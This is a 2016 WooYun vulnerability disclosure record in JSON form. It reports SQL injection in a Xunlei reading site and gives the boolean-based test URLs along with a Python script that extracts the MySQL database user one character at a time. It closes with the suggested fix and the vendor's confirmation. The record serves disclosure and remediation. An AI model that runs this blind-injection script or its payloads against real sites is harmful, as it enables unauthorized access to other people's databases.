{"id": 86801, "wybug_id": "wooyun-2016-0191505", "wybug_title": "迅雷某站SQL注入", "wybug_corp": "迅雷", "wybug_author": "路人甲", "wybug_date": "2016-04-01 19:09", "wybug_open_date": "2016-05-16 21:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-16：\t细节向公众公开  简要描述： 注入。 详细说明：  过滤得太多了。不好跑。http://yuedu.xunlei.com/?action=lists&cid=3&typeid=1 and 1http://yuedu.xunlei.com/?action=lists&cid=3&typeid=1 and 0 判断为注入。   漏洞证明：  \n#encoding=gbkimport urllib2import syspayloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')user = ''result = ''for i in range(1,15):    for payload in payloads:        s = hex(ord(payload)).replace('0x','')        url = 'http://yuedu.xunlei.com/?action=lists&cid=3&typeid=1 and current_user like 0x%s%s25' % (result,s)        request = urllib2.Request(url)        response = urllib2.urlopen(request).read()        if(len(response)<130000):            print '.',        else:            result += s            user += payload            sys.stdout.write('\\r[In progress] %s' % user)            sys.stdout.flush()            breakprint '\\n[Done]MySQL user is', user\n\n\n   修复方案：  intval   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2016-04-01 20:51 厂商回复： 感谢您的反馈。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}